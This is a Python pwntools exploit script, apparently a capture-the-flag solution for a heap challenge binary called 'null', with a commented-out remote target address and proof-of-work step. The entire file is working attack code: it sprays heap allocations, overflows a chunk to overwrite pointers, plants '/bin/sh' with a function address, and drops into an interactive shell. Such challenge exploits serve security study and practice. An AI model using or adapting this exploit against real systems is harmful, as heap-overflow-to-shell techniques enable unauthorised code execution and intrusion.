from pwn import *
import subprocess

password = "i'm ready for challenge"

def alloc(size, blocks, data):
    r.sendlineafter('Action: ', '1')
    r.sendlineafter('Size: ', str(size))
    r.sendlineafter('blocks: ', str(blocks))
    r.sendlineafter('(0/1): ', '1')
    r.sendafter('Input: ', 'A'*8)


    for i in xrange(4):
        r.send(p64(0x411))

    r.send(p64(0x411) * size)

    return

def hack():
    r.sendlineafter('password: \n', password)

    r.sendlineafter('Action: ', '1')
    r.sendlineafter('Size: ', str(0xc8))
    r.sendlineafter('blocks: ', "3")
    r.sendlineafter('(0/1): ', '0')
#    r.sendafter('Input: ', 'A'*8)


    #alloc(0xc8, 3, 'lel')
    #raw_input()

    for i in xrange(12):
        r.sendlineafter('Action: ', '1')
        r.sendlineafter('Size: ', "16300")
        r.sendlineafter('blocks: ', "999")
        r.sendlineafter('(0/1): ', '0')
	print str(i) + "Iteration"
    r.sendlineafter('Action: ', '1')
    r.sendlineafter('Size: ', "16300")
    r.sendlineafter('blocks: ', "334")
    r.sendlineafter('(0/1): ', '0')
    for i in xrange(14):
        r.sendlineafter('Action: ', '1')
        r.sendlineafter('Size: ', "200")
        r.sendlineafter('blocks: ', "0")
        r.sendlineafter('(0/1): ', '1')
	r.recvuntil("t:")
	lol = "C"*100
	lol += str(i)
	lol = lol.ljust(199,"D")
	r.sendline(lol)
	print str(i) + "Part 2"
    r.sendlineafter('Action: ', '1')
    r.sendlineafter('Size: ', "20")
    r.sendlineafter('blocks: ', "10")
    r.sendlineafter('(0/1): ', '0')

    r.sendlineafter('Action: ', '1')
    r.sendlineafter('Size: ', "600")
    r.sendlineafter('blocks: ', "0")
    r.sendlineafter('(0/1): ', '1')
    r.recvuntil("t:")

    buf = "X"*598
    r.sendline(buf)
#    finale = "Y"*193
    finale = "Y"
    finale += p64(0x31)

    finale += p64(0x00)*4
    finale += p64(0x60201d)*2
    finale += p64(0x0000000003ffd000)*2
    finale += p64(0x0000000300000000)
    finale += p64(0x60201d)*10
#    finale += "Z"*8
    r.sendline(finale)
    raw_input("SEE")

    r.sendlineafter('Action: ', '1')
    r.sendlineafter('Size: ', "96")
    r.sendlineafter('blocks: ', "0")
    r.sendlineafter('(0/1): ', '1')
    r.recvuntil("t:")

    lol = "/bin/sh\x00RRR"
    lol += p64(0x400978)
    lol = lol.ljust(95,"R")
    r.sendline(lol)

    r.interactive()


#r = remote('47.75.57.242', 5000)
r = process("./null")
'''
raw_input()
r.recvuntil("28 ")
leak = r.recv(8)
cmd = "hashcash -m -b 28 %s" % leak
proc = subprocess.Popen([cmd], stdout=subprocess.PIPE, shell=True)
cmd = "hashcash -m -b 28 %s" % leak
(out, err) = proc.communicate()
print out
r.sendline(out)
'''
hack()
